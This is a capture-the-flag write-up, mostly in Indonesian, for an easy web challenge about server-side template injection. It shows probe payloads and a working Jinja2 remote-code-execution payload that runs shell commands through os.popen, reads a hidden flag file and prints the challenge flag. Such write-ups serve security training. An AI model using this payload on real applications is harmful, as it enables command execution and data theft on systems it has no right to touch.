# Write-up: BabySSTI
<img width="621" height="153" alt="image" src="https://github.com/user-attachments/assets/f995459a-002d-4630-9963-47e3c7e144bf" />

## 📝 Challenge Description
> Vuln Server Side Template Injection

---

## 📊 Details
- **Category:** Web 
- **Difficulty:** Easy

---

## 🔍 Discovery 
Saat pertama kali masuk ke aplikasi kamu akan melihat form input yang mengembalikan nilai 
<img width="659" height="361" alt="image" src="https://github.com/user-attachments/assets/c4de3976-7af5-4132-a030-ccb1e212db35" />

Karena dari judul STTI (Server-Side Template Injection) jadi kita mencoba payload sederhana **{{7*7}}** dan karena mengembalikan output **49** ini menunjukkan aplikasi ini rentan dengan SSTI
<img width="659" height="361" alt="image" src="https://github.com/user-attachments/assets/9b4bd220-66e8-4ebd-b0d3-34182635a145" />

---

## 🚀 exploitation Steps

### 1. Check Template Lengauge
Setelah mengetahui bahwa rentan dengan SSTI kita bisa mencoba, Jika payload {{7*'7'}} mengembalikan 49 in Twig and 7777777 in Jinja2.
<img width="659" height="361" alt="image" src="https://github.com/user-attachments/assets/88a3ae18-2e17-4c7a-bb08-1bdceaed0ec1" />

Karena mengembalikan 7777777 aplikasi ini menggunakan Jinja2.

### 2. Use Payload RCE (Remote COde Execute)
Karena sudah mengetahui template lenguge kita bisa menggunakan payload yang menyesuaikan seperti berikut perintah untuk membaca id
```
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### 3. Finding the Flag
Setelah mencoba menyisir file menggunakan perintah ls aku mendapatkan flag dengan menggunakan command ini : 
```
{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /home/ctf/.s3cr3t_h1dd3n_f0lder/flag.txt').read()}}
```
<img width="659" height="361" alt="image" src="https://github.com/user-attachments/assets/44452252-3744-42c3-9e98-98fcc0cff332" />


---

## 🚩 Flag
`REDLIMIT{BabyWebSSTI_NoBlacklist}`

---
